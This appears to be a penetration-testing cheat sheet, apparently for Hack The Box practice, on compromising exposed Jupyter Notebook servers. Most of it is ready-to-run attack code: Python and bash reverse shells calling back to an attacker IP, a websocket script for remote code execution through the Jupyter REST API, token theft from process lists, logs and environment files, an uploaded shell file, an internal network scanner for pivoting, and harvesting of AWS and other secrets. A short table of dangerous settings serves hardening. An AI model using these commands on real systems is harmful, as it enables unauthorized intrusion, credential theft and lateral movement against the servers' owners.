#Jupyter #JupyterNotebook #Python #RCE #webservices #datascience

## What is Jupyter Notebook?
Browser-based interactive computing environment for Python (and other kernels). Commonly deployed without authentication in internal/lab environments. When exposed — any visitor gets a full Python terminal with OS access as the running user. Extremely common in HTB data science / ML boxes.

- Port: **TCP 8888** (default), also 8889, 8890, 9999
- Token auth: present in modern installs (token in URL/config) — often missing or findable
- Password auth: optional, often not set
- Lab interface: `/lab` (JupyterLab), Classic: `/tree`, `/notebooks/`
- Terminal: `/terminals/` — direct shell without needing Python

---

## Identification

```bash
# Nmap
nmap -p 8888,8889 --script http-title,banner -sV <target>

# Check if accessible
curl -s http://<target>:8888/
curl -s http://<target>:8888/api/kernels   # lists running kernels (no auth = exposed)
curl -s http://<target>:8888/api/contents  # lists files

# Title check
curl -s http://<target>:8888/ | grep -i "jupyter\|token"

# Token in URL (check browser history, logs, process list)
# Format: http://host:8888/?token=<hex_token>

# Check running process for token
ps aux | grep jupyter
# Token visible in command line args
```

---

## Connect / Access

```bash
# No auth — direct access
http://<target>:8888/tree
http://<target>:8888/lab

# With token
http://<target>:8888/?token=<token>
http://<target>:8888/tree?token=<token>

# Password login
http://<target>:8888/login

# API access (if no auth)
curl -s http://<target>:8888/api/kernels
curl -s http://<target>:8888/api/contents
curl -s http://<target>:8888/api/sessions

# Find token from process list (if on box)
ps aux | grep "jupyter" | grep -oP "token=\K[a-f0-9]+"
cat ~/.jupyter/jupyter_notebook_config.py | grep token
cat ~/.jupyter/jupyter_server_config.py  | grep token

# Find token in log files
find / -name "*.log" 2>/dev/null | xargs grep -l "token" 2>/dev/null
grep -r "token=" /var/log/ 2>/dev/null
```

---

## Attack Vectors

### No-Auth Access — Terminal RCE

Fastest path: use the built-in terminal (no Python needed).

```bash
# Navigate to terminal
http://<target>:8888/terminals/1

# Or via New → Terminal in classic interface
# Or via Launcher → Terminal in JupyterLab

# Terminal gives direct shell as jupyter user
# Run any OS command directly
```

### No-Auth Access — Python Notebook RCE

```python
# Create new notebook: New → Python 3
# In a cell, execute OS commands:

import os
os.system('id')
os.popen('id').read()

# Reverse shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<attacker_ip>',<port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])

# One-liner
import os; os.system('bash -c "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"')

# Shell magic (Jupyter-specific)
!id
!cat /etc/passwd
!bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
```

### API-Based RCE (No Browser Needed)

Full RCE via the Jupyter REST API — useful when token is known or auth is absent.

```bash
# Step 1: Create a kernel
kernel_id=$(curl -s -X POST http://<target>:8888/api/kernels \
  -H "Content-Type: application/json" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "Kernel: $kernel_id"

# Step 2: Open WebSocket and execute code
# Using a Python helper:
python3 << 'EOF'
import requests, json, websocket, uuid, time

base = "http://<target>:8888"
token = ""   # leave empty if no auth; set if token required
headers = {"Authorization": f"token {token}"} if token else {}

# Create kernel
r = requests.post(f"{base}/api/kernels", headers=headers)
kernel_id = r.json()['id']
print(f"[+] Kernel: {kernel_id}")

# Connect WebSocket
ws_url = f"ws://<target>:8888/api/kernels/{kernel_id}/channels"
ws = websocket.create_connection(ws_url)

# Send execute request
msg_id = str(uuid.uuid4())
payload = {
    "header": {"msg_id": msg_id, "msg_type": "execute_request",
                "username": "", "session": "", "version": "5.0"},
    "parent_header": {}, "metadata": {},
    "content": {"code": "__import__('os').popen('id').read()", "silent": False}
}
ws.send(json.dumps(payload))

# Read output
for _ in range(10):
    msg = json.loads(ws.recv())
    if msg.get('msg_type') == 'execute_result':
        print(f"[+] Output: {msg['content']['data']['text/plain']}")
        break
    time.sleep(0.2)
ws.close()
EOF
```

### Token Brute Force

```bash
# Jupyter tokens are 48-char hex strings — not directly bruteforceable
# But often leaked in:

# 1. Process list
ps aux | grep jupyter

# 2. Log files
grep -r "token=" /var/log/ 2>/dev/null
find / -name "jupyter*.log" 2>/dev/null | xargs grep token

# 3. .jupyter config
cat ~/.jupyter/jupyter_notebook_config.py
cat ~/.jupyter/jupyter_server_config.py

# 4. Environment variables
cat /proc/<jupyter_pid>/environ | tr '\0' '\n' | grep -i token

# 5. Shell history
cat ~/.bash_history | grep jupyter

# 6. Screen/tmux sessions
screen -ls
tmux ls
```

### File Read / Write via API

```bash
# List files (no auth)
curl -s http://<target>:8888/api/contents/ | python3 -m json.tool
curl -s http://<target>:8888/api/contents/<path>

# Read file content
curl -s "http://<target>:8888/api/contents/<filename>.ipynb" | \
  python3 -c "import sys,json; nb=json.load(sys.stdin); [print(c['source']) for c in nb['cells']]"

# Download file via /files/ endpoint
curl -s "http://<target>:8888/files/<path/to/file>"

# Upload / create file
curl -s -X PUT http://<target>:8888/api/contents/shell.py \
  -H "Content-Type: application/json" \
  -d '{"type":"file","format":"text","content":"import os\nos.system(\"id\")"}'
```

### Pivot — Jupyter as Proxy into Internal Network

```python
# Inside Jupyter notebook — scan internal network
import socket

def scan(host, port):
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((host, port))
        return True
    except:
        return False

# Scan internal subnet
for i in range(1, 255):
    host = f"10.10.10.{i}"
    for port in [22, 80, 443, 445, 3389, 8080]:
        if scan(host, port):
            print(f"OPEN: {host}:{port}")
```

---

## Post-Access Recon

```python
# Inside notebook or terminal:

# System info
import os, subprocess
print(os.popen('whoami').read())
print(os.popen('hostname').read())
print(os.popen('ip a').read())
print(os.popen('cat /etc/passwd').read())

# Find credentials / keys in notebook files
!grep -r "password\|token\|secret\|api_key\|AWS\|credential" /home/ 2>/dev/null

# Check for AWS/cloud credentials (common in data science envs)
!cat ~/.aws/credentials
!env | grep -i "aws\|azure\|gcp\|token\|secret\|key"

# Read other notebooks (may contain hardcoded creds)
!find / -name "*.ipynb" 2>/dev/null | head -20

# Check running services
!ss -tlnp
!ps aux
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `c.ServerApp.token = ''` | No token auth — open access |
| `c.ServerApp.password = ''` | No password auth |
| `c.ServerApp.ip = '0.0.0.0'` | Exposed to network |
| `c.ServerApp.open_browser = False` (headless server) | Deployed for remote access without auth hardening |
| Running as root | Terminal/notebook = root shell |
| No `--no-browser --ip=127.0.0.1` | Exposed beyond localhost |

---

## Quick Reference

| Goal | Command |
|---|---|
| Identify | `curl -s http://host:8888/api/kernels` |
| Access (no auth) | `http://host:8888/tree` |
| Terminal RCE | `http://host:8888/terminals/1` |
| OS command (notebook) | `!id` or `import os; os.popen('id').read()` |
| Reverse shell | `import os; os.system('bash -c "bash -i >& /dev/tcp/attacker/port 0>&1"')` |
| Find token (process) | `ps aux \| grep jupyter \| grep -oP "token=\K[a-f0-9]+"` |
| List files (API) | `curl -s http://host:8888/api/contents/` |
| Read notebook | `curl -s "http://host:8888/files/notebook.ipynb"` |
